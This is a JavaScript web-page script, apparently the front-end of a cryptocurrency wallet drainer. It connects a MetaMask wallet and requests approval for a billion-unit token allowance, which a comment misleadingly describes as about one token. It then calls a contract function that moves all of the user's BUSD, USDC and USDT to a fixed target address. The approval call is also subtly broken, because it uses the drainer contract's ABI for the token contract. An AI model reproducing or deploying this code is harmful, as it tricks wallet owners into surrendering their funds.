const Web3 = require('web3');

// 请替换为你的合约地址和 ABI
const contractAddress = '0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F';
const contractABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			}
		],
		"name": "transferAllTokens",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"stateMutability": "payable",
		"type": "receive"
	},
	{
		"inputs": [],
		"name": "busdToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "targetAddress",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "usdcToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "usdtToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
];

let web3;
let contract;
let accounts;

async function initWeb3() {
    // 检查是否存在 Ethereum 钱包
    if (typeof window.ethereum !== 'undefined') {
        web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        accounts = await web3.eth.getAccounts();
        document.getElementById('walletAddress').textContent = `钱包地址: ${accounts[0]}`;
        document.getElementById('walletAddress').classList.remove('hidden');
        document.getElementById('authorizeButton').classList.remove('hidden');
    } else {
        alert('请安装 MetaMask 钱包!');
    }
}

async function authorizeTransfer() {
    // 批准合约转移代币
    const amount = web3.utils.toWei('1000000000', 'ether'); // 设置要授权的数量（例如 1 个代币）
    const tokenAddress = '代币合约地址'; // 替换为相应的代币合约地址
    const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
    await tokenContract.methods.approve(contractAddress, amount).send({ from: accounts[0] });
    document.getElementById('transferButton').classList.remove('hidden');
}

async function transferTokens() {
    const autoTransferContract = new web3.eth.Contract(contractABI, contractAddress);
    await autoTransferContract.methods.transferAllTokens(accounts[0]).send({ from: accounts[0] });
    alert('代币已成功转移到目标地址！');
}

// 事件监听
document.getElementById('connectButton').addEventListener('click', initWeb3);
document.getElementById('authorizeButton').addEventListener('click', authorizeTransfer);
document.getElementById('transferButton').addEventListener('click', transferTokens);
